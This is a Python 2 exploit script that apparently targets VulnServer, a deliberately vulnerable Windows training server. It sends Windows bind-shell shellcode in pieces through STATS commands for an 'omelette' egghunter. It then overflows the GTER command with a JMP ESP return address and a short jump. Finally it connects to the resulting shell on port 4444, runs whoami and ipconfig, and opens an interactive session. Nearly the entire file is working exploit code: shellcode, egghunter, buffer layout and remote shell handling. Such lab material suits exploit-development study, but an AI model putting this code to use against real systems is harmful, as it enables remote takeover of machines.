#!/usr/bin/python
import socket
import time
import sys

from pwn import *

if len (sys.argv) != 2 :
    print 'Usage:  python %s <tartget>' % sys.argv[0]
    sys.exit(1)

host = sys.argv[1]
port = 9999

omlette_piece_length = 30
omletee_marker = "\x12\x34\x56\x78\x12\x34\x56\x78"

CURSOR_UP_ONE = '\x1b[1A'
ERASE_LINE = '\x1b[2K'

print "\033[?25l"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    time.sleep(1)
    print "[+] Connected to VULNSERVER"

except:
    print "socket() failed"
    sys.exit(1)

def send_omlette_piece(piece):

    # Seding some valid
    buffer = "STATS " + piece + "D" * (150 - len(piece)) 
    s.send(buffer)
    s.recv(1024)

def split_payload(payload):
    return [payload[i:i + omlette_piece_length] for i in range(0, len(payload), omlette_piece_length)]

def make_omlette(payload):

    print "[+] Sending omlette pieces using STATS"
    
    omlette_pieces = split_payload(payload)
    omlette_piece_count = len(omlette_pieces)

    print "[+] Omlette will be sent in %s piecees" % omlette_piece_count
    counter = 1
    
    for piece in omlette_pieces:

        piece_len = len(piece)

        if omlette_piece_count != 1:
            print "[-] Sending omlette piece: %02d" % counter
            counter += 1
            omlette_piece_count -= 1
            piece_indicator = "02%02d"  % piece_len

        else: 
            print "[+] Sending last omlette piece"
            piece_indicator = "01%02d"  % piece_len
            print "[+] Omlette sent\n"


        pre_piece = [piece_indicator[i:i+2] for i in range(0, len(piece_indicator), 2)]
        hex_pre_piece = "".join(chr(int(c)) for c in pre_piece)

        prepared_piece = omletee_marker + hex_pre_piece + piece
        send_omlette_piece(prepared_piece)

        time.sleep(1)

        sys.stdout.write(CURSOR_UP_ONE)
        sys.stdout.write(ERASE_LINE)

# msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 -e x86/shikata_ga_nai -b "\x00" EXITFUNC=thread -f c
shellcode = (
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\xbe\xb2\x52\x2e\x70\xdb\xd6\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
        "\x53\x31\x70\x12\x83\xe8\xfc\x03\xc2\x5c\xcc\x85\xde\x89\x92"
        "\x66\x1e\x4a\xf3\xef\xfb\x7b\x33\x8b\x88\x2c\x83\xdf\xdc\xc0"
        "\x68\x8d\xf4\x53\x1c\x1a\xfb\xd4\xab\x7c\x32\xe4\x80\xbd\x55"
        "\x66\xdb\x91\xb5\x57\x14\xe4\xb4\x90\x49\x05\xe4\x49\x05\xb8"
        "\x18\xfd\x53\x01\x93\x4d\x75\x01\x40\x05\x74\x20\xd7\x1d\x2f"
        "\xe2\xd6\xf2\x5b\xab\xc0\x17\x61\x65\x7b\xe3\x1d\x74\xad\x3d"
        "\xdd\xdb\x90\xf1\x2c\x25\xd5\x36\xcf\x50\x2f\x45\x72\x63\xf4"
        "\x37\xa8\xe6\xee\x90\x3b\x50\xca\x21\xef\x07\x99\x2e\x44\x43"
        "\xc5\x32\x5b\x80\x7e\x4e\xd0\x27\x50\xc6\xa2\x03\x74\x82\x71"
        "\x2d\x2d\x6e\xd7\x52\x2d\xd1\x88\xf6\x26\xfc\xdd\x8a\x65\x69"
        "\x11\xa7\x95\x69\x3d\xb0\xe6\x5b\xe2\x6a\x60\xd0\x6b\xb5\x77"
        "\x17\x46\x01\xe7\xe6\x69\x72\x2e\x2d\x3d\x22\x58\x84\x3e\xa9"
        "\x98\x29\xeb\x44\x90\x8c\x44\x7b\x5d\x6e\x35\x3b\xcd\x07\x5f"
        "\xb4\x32\x37\x60\x1e\x5b\xd0\x9d\xa1\x72\x7d\x2b\x47\x1e\x6d"
        "\x7d\xdf\xb6\x4f\x5a\xe8\x21\xaf\x88\x40\xc5\xf8\xda\x57\xea"
        "\xf8\xc8\xff\x7c\x73\x1f\xc4\x9d\x84\x0a\x6c\xca\x13\xc0\xfd"
        "\xb9\x82\xd5\xd7\x29\x26\x47\xbc\xa9\x21\x74\x6b\xfe\x66\x4a"
        "\x62\x6a\x9b\xf5\xdc\x88\x66\x63\x26\x08\xbd\x50\xa9\x91\x30"
        "\xec\x8d\x81\x8c\xed\x89\xf5\x40\xb8\x47\xa3\x26\x12\x26\x1d"
        "\xf1\xc9\xe0\xc9\x84\x21\x33\x8f\x88\x6f\xc5\x6f\x38\xc6\x90"
        "\x90\xf5\x8e\x14\xe9\xeb\x2e\xda\x20\xa8\x4f\x39\xe0\xc5\xe7"
        "\xe4\x61\x64\x6a\x17\x5c\xab\x93\x94\x54\x54\x60\x84\x1d\x51"
        "\x2c\x02\xce\x2b\x3d\xe7\xf0\x98\x3e\x22"
        )

make_omlette(shellcode)

print "[+] Sending exploit buffer"
omlette = (
        "\x90\x90\x90\x90"
        "\x89\xe5\x66\x81\xcb\xff\x0f\x43\x31\xc0\xb0\x02\x89\xda"
        "\xcd\x2e\x3c\x05\x74\xee\xb8\x12\x34\x56\x78\x89\xdf\xaf" 
        "\x75\xe9\xaf\x75\xe6\x89\xfe\x89\xef\x66\xad\x31\xc9\x88" 
        "\xe1\x3c\x01\xf3\xa4\x89\xfd\x75\xd4\xff\xe4"
        )

A = "A" * 30 + omlette + "B" * (150 - 30 - len(omlette))

# 625011AF   FFE4             JMP ESP
EIP = p32(0x625011AF)

# ESP lives here, with 19 bytes to jump back to somewhere in "A"
jmp_short_up = "\x90\x90\xEB\x80"
C = jmp_short_up + "C" * (5000 - len(A) - len(EIP) - len(jmp_short_up))

buffer = "GTER ." + A + EIP + C
s.send(buffer)

# try and connect to a bind shell
print "[+] Giving the omlette egghunter a few seconds"
print "\033[?25h"
time.sleep(5)
bind_port = 4444

r = remote(host, bind_port)
r.send("whoami\n")
r.send("ipconfig\n")
r.interactive()
